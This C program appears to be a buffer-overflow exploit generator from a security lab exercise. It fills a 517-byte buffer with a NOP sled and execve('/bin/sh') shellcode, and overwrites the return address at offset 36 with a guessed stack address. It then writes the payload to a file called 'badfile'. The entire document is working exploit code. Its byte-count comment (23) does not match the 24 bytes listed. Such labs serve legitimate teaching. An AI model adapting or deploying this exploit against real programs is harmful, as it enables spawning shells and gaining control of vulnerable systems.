#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// Shellcode (23 bytes)
const char code[] = 
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
  "\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

void main() {

  char buffer[517];
  FILE *badfile;

  // Fill buffer with NOPs (0x90) except the last 23 bytes
  memset(buffer, 0x90, 517 - sizeof(code));

  // Place shellcode at the end of the buffer
  memcpy(buffer + (517 - sizeof(code)), code, sizeof(code));

  // Overwrite return address (offset = 36 bytes)
  long *ret = (long *)(buffer + 36);
  *ret = 0xbfffed00; // Best guess for ASR (adjust if needed)

  // Write to badfile
  badfile = fopen("badfile", "w");
  fwrite(buffer, 517, 1, badfile);
  fclose(badfile);
}

